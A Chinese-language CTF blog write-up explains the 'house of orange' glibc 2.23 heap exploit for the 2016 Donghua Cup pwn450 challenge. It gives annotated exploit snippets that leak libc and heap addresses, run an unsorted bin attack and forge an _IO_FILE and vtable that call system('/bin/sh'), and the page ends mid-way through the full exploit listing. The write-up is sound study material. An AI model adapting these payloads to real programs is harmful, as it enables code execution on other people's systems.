<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/faceicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/faceicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="​	这一周跟着raycp师傅的博客学了学IO FILE入门相关的知识，记录下house of orange的解题过程（跟比赛中的东东相比有些年代了…）">
<meta property="og:type" content="article">
<meta property="og:title" content="house of orange">
<meta property="og:url" content="http://example.com/2023/03/05/house-of-orange/index.html">
<meta property="og:site_name" content="1903">
<meta property="og:description" content="​	这一周跟着raycp师傅的博客学了学IO FILE入门相关的知识，记录下house of orange的解题过程（跟比赛中的东东相比有些年代了…）">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677924841443.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677925005518.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677928090686.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677929821460.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677981605004.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677980673650.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677982121546.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677984956101.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677985104606.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677986238443.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677988358140.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677988419641.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677991259559.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677994247278.png">
<meta property="og:image" content="http://example.com/2023/03/05/house-of-orange/1677996300792.png">
<meta property="article:published_time" content="2023-03-05T08:34:23.000Z">
<meta property="article:modified_time" content="2023-03-10T10:44:44.395Z">
<meta property="article:author" content="hhhhhh_">
<meta property="article:tag" content="-PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/03/05/house-of-orange/1677924841443.png">

<link rel="canonical" href="http://example.com/2023/03/05/house-of-orange/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>house of orange | 1903</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">1903</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/05/house-of-orange/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="hhhhhh_">
      <meta itemprop="description" content="想去北方看看">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="1903">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          house of orange
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-05 16:34:23" itemprop="dateCreated datePublished" datetime="2023-03-05T16:34:23+08:00">2023-03-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-03-10 18:44:44" itemprop="dateModified" datetime="2023-03-10T18:44:44+08:00">2023-03-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%A0%86/" itemprop="url" rel="index"><span itemprop="name">-堆</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>​	这一周跟着raycp师傅的博客学了学IO FILE入门相关的知识，记录下house of orange的解题过程（跟比赛中的东东相比有些年代了…）</p>
<span id="more"></span>

<h3 id="pwn450-note-2016东华杯"><a href="#pwn450-note-2016东华杯" class="headerlink" title="pwn450_note_2016东华杯"></a>pwn450_note_2016东华杯</h3><p>​	raycp师傅博客的例题，就直接从题目入手，遇到什么写什么（即使已经跟了一遍，再次复现还是有点懵）</p>
<h4 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h4><ol>
<li>add：可以申请大于0x200的任意size的chunk，但同时只能存在一个chunk，同时打印堆块地址；</li>
<li>show：fake；</li>
<li>edit：存在堆溢出，且是任意长度；</li>
<li>delete：正常free（清空了指针）</li>
</ol>
<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><h5 id="leak-libc-address"><a href="#leak-libc-address" class="headerlink" title="leak libc address"></a>leak libc address</h5><p>​	新get的点：通过mmap内存空间来泄露libc地址</p>
<blockquote>
<p>当申请较大内存时，通过mmap分配，而mmap分配的内存与libc存在固定偏移；</p>
</blockquote>
<p>​	顺便去看了下源码，在malloc刚开始时，并未判断size大小来觉得是否mmap而是在use top之后的sysmalloc中才看到nb与mmap阈值的比较。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if (av == NULL</span><br><span class="line">      || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">      char *mm;           /* return value from mmap call*/</span><br><span class="line"></span><br><span class="line">    try_mmap:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>​	回到本题，gdb调试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#leak libc address</span><br><span class="line">add(0x2000000)</span><br><span class="line">libc.address = int(sh.recv(14), 16) + 0x2001000 - 0x10</span><br><span class="line">print(hex(libc.address))</span><br></pre></td></tr></table></figure>

<p>malloc前</p>
<p><img src="/2023/03/05/house-of-orange/1677924841443.png" alt="1677924841443"></p>
<p>malloc后：</p>
<p><img src="/2023/03/05/house-of-orange/1677925005518.png" alt="1677925005518"></p>
<p>​	mmap得到的内存空间紧贴libc，其中多出来的0x1000看博客说是因为对齐。</p>
<p>​	其中unsorted bin的链表头在main arena中偏移为88的位置（x64）；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#find function address</span><br><span class="line">system = libc.sym[&#x27;system&#x27;] + 0x10</span><br><span class="line">_IO_list_all = libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line">main_arena = libc.sym[&#x27;__malloc_hook&#x27;] + 0x10</span><br><span class="line">unsorted_bin_head = main_arena + 88</span><br></pre></td></tr></table></figure>

<h5 id="leak-heap-address"><a href="#leak-heap-address" class="headerlink" title="leak heap address"></a>leak heap address</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#leak heap address</span><br><span class="line">add(0x200)</span><br><span class="line">heap = int(sh.recv(9), 16) - 0x10</span><br><span class="line">print(hex(heap))</span><br></pre></td></tr></table></figure>

<h5 id="泄露完libc和堆地址，思考如何利用："><a href="#泄露完libc和堆地址，思考如何利用：" class="headerlink" title="泄露完libc和堆地址，思考如何利用："></a>泄露完libc和堆地址，思考如何利用：</h5><p>​	unsorted bin attack + FSOP，大体思路就是通过unsorted bin attack将_IO_list_all劫持到main_arena中unsorted bin对应位置；</p>
<blockquote>
<p>但是main_arena区域仍是不可控的，我们无法在main_arena上伪造_IO_FILE结构体</p>
</blockquote>
<p>​	然而，FILE结构体是通过chain指针链起来的，chain字段指向下一个FILE结构体，如果该字段可控，就可以将其劫持到一段用户可控的内存，然后伪造IO FILE结构体；</p>
<blockquote>
<p>_IO_flush_all_lockp( )函数，会遍历链表所有结构体，并依次刷新它们的输出缓冲区</p>
</blockquote>
<p>借用stdin，可以看到chain字段在0x68的位置：</p>
<p><img src="/2023/03/05/house-of-orange/1677928090686.png" alt="1677928090686"></p>
<p>再看main_arena：</p>
<p><img src="/2023/03/05/house-of-orange/1677929821460.png" alt="1677929821460"></p>
<p>​	unsorted bin head后0x68处其实为smallbin中size为0x60的链表头的bk指针，指向链表中末项，所以只需劫持该bk指针指向我们伪造的IO FILE结构体即可；</p>
<blockquote>
<p>只需在一个处于unsorted bin的chunk内伪造IO FILE结构体，并修改size为0x61即可：</p>
<ol>
<li>IO FILE结构体前4个字段（32字节）与IO FILE方面的利用无关，为何值并无大碍，可充当chunk头部；</li>
<li>libc-2.23对在进行unsorted bin遍历，将chunk链入对应size的链表时没什么检查</li>
</ol>
</blockquote>
<h5 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h5><p>​	由于程序只能保留一个chunk，导致free后与会与top chunk进行合并，从而无法进入unosrted bin。</p>
<p>​	bin中无chunk谈何attack？</p>
<h6 id="get-unsorted-bin"><a href="#get-unsorted-bin" class="headerlink" title="get unsorted bin"></a>get unsorted bin</h6><p>​	这里又是一个新get的点，当top chunk 无法满足分配时，会重新分配一个新的top chunk，而旧的top chunk就会进入unsorted bin。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">					if (old_size &gt;= MINSIZE)</span><br><span class="line">                        &#123;</span><br><span class="line">                          _int_free (av, old_top, 1);</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<p>check：（依据博客）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">         ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse (old_top) &amp;&amp;</span><br><span class="line">          ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br></pre></td></tr></table></figure>

<p>​	利用后半部分，前两个很好理解，第三个是为了实现页对齐。</p>
<h6 id="edit-top-chunk-size"><a href="#edit-top-chunk-size" class="headerlink" title="edit top chunk size"></a>edit top chunk size</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#edit top chunk size</span><br><span class="line">payload = &#x27;a&#x27;*0x200</span><br><span class="line">payload += p64(0) + p64(0xdf1)</span><br><span class="line"># payload += &#x27;\x00&#x27;*0x18 + p64(0x21)</span><br><span class="line">edit(payload)</span><br></pre></td></tr></table></figure>

<p>（注释部分是看博客的exp，不知道作用是啥，不用也能通）	</p>
<p>在delete之后，malloc之前停下来：</p>
<p><img src="/2023/03/05/house-of-orange/1677981605004.png" alt="1677981605004"></p>
<p>​	此时 top chunk依然是页对齐的（0x210的chunk与top chunk会先合并）</p>
<p>再malloc一个大于0x1000的堆块，old top chunk就会进入unsorted bin：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#let old top chunk into unsorted bin</span><br><span class="line">add(0x1000)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/05/house-of-orange/1677980673650.png" alt="1677980673650"></p>
<p>​	但size却少了0x20，被切割出了一个0x20的chunk，可能与libc的机制有关（猜测是因为一些检查需要next chunk的prev_inuse位和prev_size字段）</p>
<p><img src="/2023/03/05/house-of-orange/1677982121546.png" alt="1677982121546"></p>
<p>​	0x1010的chunk只是为了得到unsorted bin，所以直接free（会与新的top chunk合并 [从它那切割来的] ）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete()</span><br></pre></td></tr></table></figure>

<p>（前面省略了几处无关紧要的delete()）</p>
<h6 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h6><p>​	这里为了切割出第二个unsorted bin的chunk，需要将old top chunk的next chunk的precv_inuse位，置1，</p>
<p>这样再切割old top chunk并free就不会再合并；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(0x200)</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x200</span><br><span class="line">payload += p64(0) + p64(0xdd1)  #old top chunk size</span><br><span class="line">payload += p64(unsorted_bin_head) +p64(unsorted_bin_head)</span><br><span class="line">payload += &#x27;\x00&#x27;*0xdb0</span><br><span class="line">payload += p64(0xdd0) + p64(0x11)</span><br><span class="line">edit(payload)</span><br></pre></td></tr></table></figure>

<p>​	需要提的是prev_size也要布置，看博客是直接放了p64(0)（实测不行），（暂时不知道为何）：</p>
<h6 id="先提下之前疑惑的点："><a href="#先提下之前疑惑的点：" class="headerlink" title="先提下之前疑惑的点："></a>先提下之前疑惑的点：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x210)</span><br></pre></td></tr></table></figure>

<p>​	unsorted bin明明是依据bk遍历（逆序），为何结果看到的是0x210的chunk入smallbin，而old top chunk依旧在unsorted bin [彷佛感觉是0x210的chunk无法满足0x220的请求而入smallbin，然后从old top chunk切割]</p>
<h6 id="实际调试："><a href="#实际调试：" class="headerlink" title="实际调试："></a>实际调试：</h6><p>​	unsorted bin遍历时第一个拿到的确实是old top chunk（last chunk），但它并不直接满足nb需求，所以被放入了large bin中：</p>
<p><img src="/2023/03/05/house-of-orange/1677984956101.png" alt="1677984956101"></p>
<p>第一次遍历的chunk最终取出后，继续下一个：</p>
<p><img src="/2023/03/05/house-of-orange/1677985104606.png" alt="1677985104606"></p>
<p>（之前有理解误区，所以贴下）</p>
<p>对smallbin的入链同理，这里直接跳到unsorted bin遍历结束：</p>
<p>​	由于我们申请的是smallbin大小的chunk，并不会先去largebin中寻找，而是跳转至++idx，根据bitmap查询大于nb请求的bin中是否有满足需求的chunk；（本题中largebin的old top chunk满足需求）</p>
<p>找到合适的chunk后：</p>
<p><img src="/2023/03/05/house-of-orange/1677986238443.png" alt="1677986238443"></p>
<p>暂时略过chunk切割的部分，直接到链入unsorted bin：</p>
<p><img src="/2023/03/05/house-of-orange/1677988358140.png" alt="1677988358140"></p>
<p>最终效果就如预想一般：</p>
<p><img src="/2023/03/05/house-of-orange/1677988419641.png" alt="1677988419641"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete()</span><br><span class="line">add(0x200)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/05/house-of-orange/1677991259559.png" alt="1677991259559"></p>
<h6 id="开始利用："><a href="#开始利用：" class="headerlink" title="开始利用："></a>开始利用：</h6><p>（初看时有点懵）大体可以分成3块：</p>
<ol>
<li><p>堆溢出时需要跨过中间的0x220的chunk；</p>
<p>（为何要切割出两个unsorted bin chunk，attack一定要2个？，暂留疑问）</p>
</li>
<li><p>在old top chunk处的构造：</p>
<ol>
<li>链入0x60大小的smallbin时chunk头的伪造（4个字段）；（对于IO的利用没啥用，所以并不影响）</li>
<li>IO FILE结构体各个字段的布置；</li>
</ol>
</li>
<li><p>vtable的伪造（这里直接布置在了IO FILE结构体后面）；</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">payload = &quot;a&quot;*0x200</span><br><span class="line">payload += p64(0x210) + p64(0x221)</span><br><span class="line">payload += p64(heap + 0x430) + p64(unsorted_bin_head)</span><br><span class="line">payload +=  &#x27;\x00&#x27;*0x200</span><br><span class="line"></span><br><span class="line">fake_buf = &#x27;/bin/sh\x00&#x27; + p64(0x61) + p64(0) + p64(_IO_list_all - 0x10)</span><br><span class="line">fake_buf += p64(0)</span><br><span class="line">fake_buf += p64(1)</span><br><span class="line">fake_buf = fake_buf.ljust(0xc0, &#x27;\x00&#x27;)</span><br><span class="line">fake_buf += p64(0xffffffffffffffff)</span><br><span class="line">fake_buf = fake_buf.ljust(0xd8, &#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">vtable = heap + 0x10 + 0x200 + 0x220 + len(fake_buf) + 8</span><br><span class="line">fake_buf += p64(vtable)</span><br><span class="line"></span><br><span class="line">fake_buf += p64(0)</span><br><span class="line">fake_buf += p64(0)</span><br><span class="line">fake_buf += p64(1)</span><br><span class="line">fake_buf += p64(system)</span><br><span class="line"></span><br><span class="line">payload += fake_buf</span><br><span class="line">edit(payload)</span><br></pre></td></tr></table></figure>

<h6 id="先理一理整个攻击流程："><a href="#先理一理整个攻击流程：" class="headerlink" title="先理一理整个攻击流程："></a>先理一理整个攻击流程：</h6><ol>
<li><p>[修改old top chunk的bk指针到_IO_list_all附近]，malloc时进入unsorted bin遍历，在脱unsorted bin链时，来触发unsorted bin attack，使得IO_list_all指向unsorted bin head（main_arena+88）；</p>
</li>
<li><p>[修改old top chunk的size字段为0x61]，从unsortbin中取出后，会根据size进入到对应大小的smallbin（0x60）</p>
<p>（由于我们是在一个IO FILE结构体的前32字节伪造chunk头，使得这片内存能够进入smallbin，造成smallbin（0x60）’s bk（和fd，因为bin中只有一个chunk）指向了该IO FILE结构体）</p>
</li>
<li><p>unsorted bin attack过后，unsorted bin’s bk被指向了_IO_list_all - 0x10的位置（并未伪造chunk头），以至于unsorted bin遍历到下一次时，过不了检查：</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> while ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            if (__builtin_expect(chunksize_nomask(victim) &lt;= 2 * SIZE_SZ, 0) ||</span><br><span class="line">                __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, 0))</span><br><span class="line">                malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,</span><br><span class="line">                                chunk2mem(victim), av);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>调试下：</p>
<p><img src="/2023/03/05/house-of-orange/1677994247278.png" alt="1677994247278"></p>
<ol>
<li><p>接3：正是利用了这一点，调用了malloc_printerr()-&gt;abort()-&gt;_IO_flush_all_lockp()；</p>
<p>（或许为此才需要unsorted bin中有2个chunk？）</p>
<p>而_IO_flush_all_lockp()会刷新所有FILE的缓冲区，进而调用了_IO_OVERFLOW函数（在vtable中，使得我们能够劫持程序执行流），因为我们有机会伪造FILE结构体，而vtable指针亦是可控的，意味着整张vtable表都可由我们伪造，这就包括了_IO_OVERFLOW的指针（该函数在调用时第一个参数为fp，即当前FILE结构体的指针，这也是为什么在伪造IO FILE时，第一个字段为’&#x2F;bin&#x2F;sh’的原因）</p>
</li>
<li><p>IO_list_all指向unsorted bin head，将它视作一个FILE结构体来看时，对应chain字段刚好指向我们伪造的FILE结构体（也就是smallbin（0x60）的bk指针）</p>
</li>
</ol>
<blockquote>
<p>FILE链表由chain字段维护；</p>
</blockquote>
<h6 id="IO-FILE结构体字段布置"><a href="#IO-FILE结构体字段布置" class="headerlink" title="IO FILE结构体字段布置"></a>IO FILE结构体字段布置</h6><p>check：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">	   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br></pre></td></tr></table></figure>

<p>​	为了成功执行到_IO_OVERFLOW需要满足：</p>
<blockquote>
<ol>
<li>_mode &lt; 0</li>
<li>_IO_write_ptr &gt; _IO_write_base</li>
</ol>
</blockquote>
<p>除此之外，还有一个vtable指针需要布置，以及vtable中_IO_OVERFLOW的指针（第4个）修改为system即可；</p>
<p>借用下stdin：</p>
<p><img src="/2023/03/05/house-of-orange/1677996300792.png" alt="1677996300792"></p>
<p>布置完后，malloc才是攻击的开始：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(0.5)</span><br><span class="line">add(0xb00)</span><br></pre></td></tr></table></figure>

<h6 id="最后来说下为什么需要2个unsorted-bin-chunk才能实现利用："><a href="#最后来说下为什么需要2个unsorted-bin-chunk才能实现利用：" class="headerlink" title="最后来说下为什么需要2个unsorted bin chunk才能实现利用："></a>最后来说下为什么需要2个unsorted bin chunk才能实现利用：</h6><p>（一点点猜测？）</p>
<p>之前的猜测：为了unsorted bin遍历有2次？</p>
<ol>
<li>有这方面的原因，unsorted bin attack后直接跳转至malloc_printerr会直接很多（因为本题只能有一个堆块，无法连续add，若在中间free会导致大堆块进入unsorted bin过不了检查）；</li>
<li>尝试只用一个chunk去完成所有利用的过程：<ol>
<li>在unsorted bin attack之前的free时，开始的检查next_inuse位可以依靠在old top chunk对应位置布置fake size来绕过；</li>
<li>但到了入unsorted bin时，对链表的完整性检查，将无法绕过；（毕竟为了实现unsorted bin attack，已经布置了bk，冲突了）</li>
<li>对2的问题，也有想过通过修改size位进fastbin，无奈这题只有一个chunk，若强行布置就等同于跨过中间的unsorted bin chunk来写old top chunk；</li>
</ol>
</li>
</ol>
<p>（单纯unsorted bin attack一个chunk也能实现）</p>
<h6 id="补上exp："><a href="#补上exp：" class="headerlink" title="补上exp："></a>补上exp：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 